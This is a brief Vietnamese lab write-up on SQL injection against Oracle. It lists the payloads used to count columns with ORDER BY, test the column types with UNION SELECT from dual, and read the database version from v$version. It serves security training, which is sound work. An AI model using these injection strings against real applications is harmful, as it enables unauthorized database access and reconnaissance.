# SQL injection attack, querying the database type and version on Oracle

Bài lab này yêu cầu ta kiểm tra phiên bản Oracle mà máy chủ  đang sử dụng.

Kiểm tra xem có bao nhiêu cột bên trong bảng:
- `' ORDER BY 1--`
- `' ORDER BY 2--`
- `' ORDER BY 3--` (tới đây thì sever error, vậy là chỉ có 2 cột trong bảng)

Tiếp theo ta kiểm tra xem kiểu dữ liệu bên trong từng cột của bảng:
- `' UNION SELECT 'ahihi','hehehe' FROM dual--` (mặc định bên trong Oracle luôn có bảng ảo `dual` )

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134408970359013442/image.png)

Vậy là cả hai cột đều có kiểu dữ liệu `string`(kiểu dữ liệu chuỗi cũng là kiểu dữ liệu diễn tả phiên bản oracle đang dùng)

Tiếp theo ta truy cập vào cột `BANNER` của bảng `v$version` :
- `' UNION SELECT NULL,BANNER FROM v$version--`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134410334531227659/image.png)